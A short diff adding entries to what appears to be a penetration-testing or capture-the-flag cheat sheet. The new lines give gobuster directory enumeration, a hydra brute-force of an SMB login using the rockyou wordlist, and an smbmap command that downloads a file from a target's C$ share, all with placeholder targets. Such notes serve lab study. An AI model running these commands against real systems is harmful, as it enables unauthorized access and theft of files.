@@ -42,3 +42,11 @@ set USERNAME admin
 
 Snow 
 snow.exe -C -p "password" stegfile.txt
+
+GoBuster 
+gobuster dir -u http://IP:Port -w wordlist.txt
+
+Crack the SMB credentials knowing username to obtain file stored into share Brute force smb login 
+hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> 
+smb Download file stored into share 
+smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\filename.txt'
